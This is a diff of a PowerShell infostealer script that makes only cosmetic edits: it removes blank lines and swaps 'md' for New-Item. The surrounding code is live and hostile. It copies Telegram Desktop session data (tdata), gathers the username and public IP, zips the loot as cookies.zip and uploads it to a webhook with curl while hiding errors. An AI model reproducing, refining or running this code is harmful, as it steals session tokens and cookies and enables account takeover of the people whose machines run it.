@@ -10,7 +10,6 @@ foreach ($base in $searchPaths) {
         if ($files) { $found += $files }
     }
 }
-
 foreach ($f in $found) {
     if (-not $f) { continue }
     $src = $f.FullName
@@ -47,7 +46,7 @@ if (Test-Path $rob) {
 $tgPath = "$env:APPDATA\Telegram Desktop\tdata"
 if (Test-Path $tgPath) {
     $tgDest = "$d\Telegram_tdata"
-    md $tgDest -Force -ErrorAction SilentlyContinue | Out-Null
+    New-Item -Path $tgDest -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
     Copy-Item -Path "$tgPath\*" -Destination $tgDest -Recurse -Force -ErrorAction SilentlyContinue
 }
 $u = $env:USERNAME
@@ -57,7 +56,6 @@ try { $i = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -Err
 $zip = "$env:TEMP\cookies.zip"
 if (Test-Path $zip) { Remove-Item $zip -Force -ErrorAction SilentlyContinue }
 Compress-Archive -Path $d -DestinationPath $zip -Force -ErrorAction SilentlyContinue
-
 if (Test-Path $zip) {
     curl.exe -s -F "file=@$zip" $webhook
 }
